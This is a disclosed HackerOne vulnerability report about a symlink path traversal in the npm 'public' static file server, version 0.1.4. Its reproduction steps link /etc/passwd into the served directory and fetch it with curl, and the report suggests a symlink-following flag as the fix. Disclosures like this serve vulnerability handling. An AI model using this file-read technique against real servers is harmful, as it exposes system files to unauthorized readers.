---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '593911'
original_report_id: '593911'
title: '[public] Path traversal using symlink'
weakness: Path Traversal
team_handle: nodejs-ecosystem
created_at: '2019-06-02T07:16:08.509Z'
disclosed_at: '2019-08-28T09:00:44.926Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
asset_identifier: public
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- path-traversal
---

# [public] Path traversal using symlink

## Metadata

- HackerOne Report ID: 593911
- Weakness: Path Traversal
- Program: nodejs-ecosystem
- Disclosed At: 2019-08-28T09:00:44.926Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report Path traversal vulnerability in public module



# Module

**module name:** public
**version:** 0.1.4
**npm page:** `https://www.npmjs.com/package/public`

## Module Description

Run static file hosting server with specified public dir & port. Support a "direcotry index" like Apache httpd.



## Module Stats

105 downloads in the last week


# Vulnerability

## Vulnerability Description

Path traversal using symlink.



## Steps To Reproduce:

+ Install public 
```
npm install public -g
```
+ Run public server

```
➜  public ./bin/public                 
Public.js server running with "/home/xxx/h1/node_modules/public" on port 3000
```
+ Create a symlink inside your project directory.

```
$ ln -s /etc/passwd test_passwd
```
+ Request the file with curl

```
$ curl http://127.0.0.1:3000/test_passwd
root:x:0:0:root:/root:/bin/bash
```
{F500825}

## Patch

providing a flag to disable/enable following symlinks.



## Supporting Material/References:

+ Ubuntu 16.04
+ node v11.8.0
+ npm 6.5.0


# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

It allows attacker to read content of arbitary file on remote server.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
